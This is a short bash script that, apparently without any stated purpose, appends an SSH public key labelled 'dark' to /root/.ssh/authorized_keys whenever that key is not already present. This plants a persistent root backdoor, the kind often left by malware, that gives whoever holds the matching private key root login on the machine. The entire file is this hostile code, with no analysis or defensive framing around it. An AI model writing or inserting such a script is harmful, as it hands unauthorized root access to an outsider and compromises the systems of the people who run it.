#!/bin/bash

if [ -e /root ]; then
    if [ $( /bin/grep dark /root/.ssh/authorized_keys | wc -l) == 0 ]; then
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFWrAe7p9avGVdB+s7j7RN1ikPCawqbeWp5Wq0nF7XvcEYstpR+aAMpW1sKgXvFZPlbBWcX4aOMpQjvwln4l+wgxDjrQHBpOXHG8QX/bY41jX8rqn/o8XYIcPdYOsx0BUrt7QiGGAwyYRP/oApdPjUDB+ZpDDWGcGTTiCcLQhq6CfYhu9LENRQHdn4V/SFi1aaFh9x2Myp7SCDjTThbFwHrUv8kuo691HVEnbQEnULSV56cZ2iF+ThvOgLkew3tOXiMGtVIWqXiWrpk9yuQ6wLnZ0/R0uwFKwLPxyYZ7zSuudAuNEnuz2S5V6yxevKYpq9ms2VkDjdx2qkD34JcW7o43nrM/aLAocQcyLRmELGJ9ixvAdzTLc+hq+qSUvDJPKaWdEZzLgJwspV476/jRKJrpwFdg5NNJZAy8c7WC7BbBFMs0Kdc/sOEIDuIx66PoaW+KfQvs89LDRiWoPdWW2/Zil3n9E4xn6+3GRsS22Bo7bMpj4hvZoX4WFRxGipluE= dark" >> /root/.ssh/authorized_keys
    fi
fi
